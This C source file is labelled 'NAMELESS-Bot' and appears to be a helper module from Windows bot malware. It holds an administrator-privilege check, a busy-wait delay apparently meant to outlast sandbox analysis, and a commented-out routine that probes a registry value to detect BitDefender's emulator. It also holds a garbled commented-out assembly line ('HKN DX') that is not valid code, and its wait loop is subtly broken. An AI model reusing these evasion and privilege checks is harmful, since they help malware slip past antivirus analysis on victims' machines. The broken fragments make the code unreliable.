/*
            [ N A M E L E S S - Bot ]
            [       by: Carve       ]

            Thanks To; The Rogue & t0nix
*/

#include "global.h"
#include <stdlib.h>

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

//http://www.nirsoft.net/vc/isfileexist.html
BOOL FileExists(LPSTR lpszFilename)
{
    DWORD dwAttr = GetFileAttributes(lpszFilename);
    if (dwAttr == 0xffffffff)
        return FALSE;
    else
        return TRUE;
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

int IsUserAnAdmin()
{
    int bToken, bCheck;
    PSID pAdmin;
    SID_IDENTIFIER_AUTHORITY sAuthority = SECURITY_NT_AUTHORITY;

    if ( advapi32_dll != NULL )
    {
        if ( my_CheckTokenMembership != NULL )
        {
            bToken = AllocateAndInitializeSid( &sAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdmin );
            if ( bToken == 1 )
            {
                bCheck = my_CheckTokenMembership( NULL, pAdmin, &bToken );
                if ( bCheck == 0 )
                {
                    bToken = 1;
                }
            }
        }
    }
    return( bToken );
}

/*
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
*/

// random waits

void wait_(void)
{
    DWORD w = 0;
    int z = 0;
    for (z; z < 10; z++)
    {
        for (w; w < 0xAAAAAAA; w++);
          asm("nop");
          asm("nop");
          asm("nop");
    }
}

/*BOOL bitdefend()
{
HKEY hKey;
DWORD out = 0;
DWORD len = sizeof out;
DWORD dwType = REG_DWORD;
BOOLEAN ret = TRUE;
if (RegOpenKey(HKEY_CURRENT_USER, "Console", &hKey)==EXIT_SUCCESS) {
if (RegQueryValueEx(hKey, "FontSize", 0, &dwType, (BYTE*)&out, &len)==EXIT_SUCCESS) {
if (out==0) { ret = FALSE; }
}
my_RegCloseKey(hKey);
}
return ret;
}*/

/*void close_socket(char *socket)
{
    __asm
    {
        HKN DX [ebp,socket]
    }
}*/
